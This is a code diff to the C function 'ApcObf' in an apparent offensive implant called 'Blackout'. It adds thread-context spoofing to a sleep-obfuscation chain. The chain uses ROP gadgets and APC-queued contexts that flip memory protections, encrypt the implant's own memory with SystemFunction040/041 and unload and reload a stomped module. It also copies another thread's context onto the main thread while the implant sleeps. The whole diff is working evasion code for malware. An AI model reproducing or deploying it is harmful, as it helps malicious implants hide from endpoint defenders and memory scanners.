@@ -252,6 +252,10 @@ FUNC VOID ApcObf(
 
     LONG   Status     = 0x00;
 
+    UINT32 DupThreadId      = bkThreadEnum();
+    HANDLE DupThreadHandle  = NULL;
+    HANDLE MainThreadHandle = NULL;
+
     HANDLE EvtSync       = NULL;
     HANDLE hDuplicateObj = NULL;
     HANDLE hSlpThread    = NULL;
@@ -260,13 +264,13 @@ FUNC VOID ApcObf(
     PVOID   OldProt    = NULL;
     HANDLE  TmpVal     = NULL;
 
-    CONTEXT CtxMain   = { 0 };
-    CONTEXT CtxBackup = { 0 };
-    CONTEXT CtxSpoof  = { 0 };
+    CONTEXT CtxMain = { 0 };
+    CONTEXT CtxBkp  = { 0 };
+    CONTEXT CtxSpf  = { 0 };
 
     UINT16 ic = 0;
 
-    CONTEXT Ctx[10] = { 0 }; // stomp 9 - normal 6
+    CONTEXT Ctx[12] = { 0 }; // stomp 9 - normal 6
 
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) goto _Leave;    
@@ -292,10 +296,19 @@ FUNC VOID ApcObf(
     BK_PRINT( "[BK] Blackout Rx base address @ 0x%p [0x%x bytes]\n", Blackout().RxRegion.Base, Blackout().RxRegion.Length );
     BK_PRINT( "[BK] Blackout Rw base address @ 0x%p [0x%x bytes]\n\n", Blackout().RwRegion.Base, Blackout().RwRegion.Length );
 
+    BK_PRINT( "[OBF] Thread Id to duplicate: %d\n", DupThreadId );
     BK_PRINT( "[OBF] Rbx gadget @ 0x%p\n", Blackout().SleepObf.JmpGadget );
     BK_PRINT( "[OBF] ret gadget to NtTestAlert @ 0x%p\n", Blackout().SleepObf.RetGadget );
     BK_PRINT( "[OBF] NtContinue gadget @ 0x%p\n", Blackout().SleepObf.NtContinueGadget );
-    BK_PRINT( "[OBF] SleepObf chain thread at tid: %d\n", hSlpThread );
+    BK_PRINT( "[OBF] SleepObf chain thread at handle: %d\n", hSlpThread );
+
+    Status = bkThreadOpen( THREAD_ALL_ACCESS, FALSE, DupThreadId, &DupThreadHandle );
+
+    Status = Instance()->Win32.DuplicateHandle( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &MainThreadHandle, THREAD_ALL_ACCESS, FALSE, 0 );
+
+    CtxSpf.ContextFlags = CtxBkp.ContextFlags = CONTEXT_ALL;
+
+    Instance()->Win32.NtGetContextThread( DupThreadHandle, &CtxSpf );
 
     CtxMain.ContextFlags = CONTEXT_FULL;
     Status = Instance()->Win32.NtGetContextThread( hSlpThread, &CtxMain );
@@ -315,6 +328,18 @@ FUNC VOID ApcObf(
     // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtGetContextThread;
+    Ctx[ic].Rcx = MainThreadHandle;
+    Ctx[ic].Rdx = &CtxBkp;
+    ic++;
+
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtSetContextThread;
+    Ctx[ic].Rcx = MainThreadHandle;
+    Ctx[ic].Rdx = &CtxSpf;
+    ic++;
+
     if ( Blackout().Stomp.Backup ) {
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
@@ -322,13 +347,17 @@ FUNC VOID ApcObf(
         Ctx[ic].Rcx = Blackout().Stomp.Backup;
         Ctx[ic].Rdx = Blackout().Region.Base;
         Ctx[ic].R8  = Blackout().Region.Length;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
+        Ctx[ic].Rcx = Blackout().Stomp.Backup;
+        Ctx[ic].Rdx = Blackout().Region.Length;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.LdrUnloadDll;
         Ctx[ic].Rcx = Blackout().Stomp.ModBase;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget; 
@@ -336,23 +365,21 @@ FUNC VOID ApcObf(
         Ctx[ic].Rcx = Blackout().Stomp.ModName.Buffer;
         Ctx[ic].Rdx = NULL;
         Ctx[ic].R8  = DONT_RESOLVE_DLL_REFERENCES;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
     } else {
+
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
         Ctx[ic].Rcx = Blackout().RxRegion.Base;
         Ctx[ic].Rdx = Blackout().RxRegion.Length;
         Ctx[ic].R8  = PAGE_READWRITE;
         Ctx[ic].R9  = &OldProt;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.SystemFunction040;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Region.Length;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
     }
 
@@ -361,17 +388,22 @@ FUNC VOID ApcObf(
     Ctx[ic].Rcx = NtCurrentProcess();
     Ctx[ic].Rdx = SleepTime;
     Ctx[ic].R8  = FALSE;
-    // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
     ic++;
 
     if ( Blackout().Stomp.Backup ) {
+
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.VirtualProtect;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Region.Length;
         Ctx[ic].R8  = PAGE_READWRITE;
         Ctx[ic].R9  = &OldProt;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
+        ic++;
+
+        Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+        Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
+        Ctx[ic].Rcx = Blackout().Stomp.Backup;
+        Ctx[ic].Rdx = Blackout().Region.Length;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
@@ -379,7 +411,6 @@ FUNC VOID ApcObf(
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Stomp.Backup;
         Ctx[ic].R8  = Blackout().Region.Length;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
@@ -388,14 +419,13 @@ FUNC VOID ApcObf(
         Ctx[ic].Rdx = Blackout().RxRegion.Length;
         Ctx[ic].R8  = PAGE_EXECUTE_READ;
         Ctx[ic].R9  = &OldProt;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++; 
     } else {
+
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
         Ctx[ic].Rbx = &Instance()->Win32.SystemFunction041;
         Ctx[ic].Rcx = Blackout().Region.Base;
         Ctx[ic].Rdx = Blackout().Region.Length;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
 
         Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
@@ -404,9 +434,14 @@ FUNC VOID ApcObf(
         Ctx[ic].Rdx = Blackout().RxRegion.Length;
         Ctx[ic].R8  = PAGE_EXECUTE_READ;
         Ctx[ic].R9  = &OldProt;
-        // *(PVOID*)Ctx[ic].Rsp = Instance()->Win32.NtTestAlert;
         ic++;
     }
+
+    Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
+    Ctx[ic].Rbx = &Instance()->Win32.NtSetContextThread;
+    Ctx[ic].Rcx = MainThreadHandle;
+    Ctx[ic].Rdx = &CtxBkp;
+    ic++;
 
     Ctx[ic].Rip = Blackout().SleepObf.JmpGadget;
     Ctx[ic].Rbx = &Instance()->Win32.RtlExitUserThread;
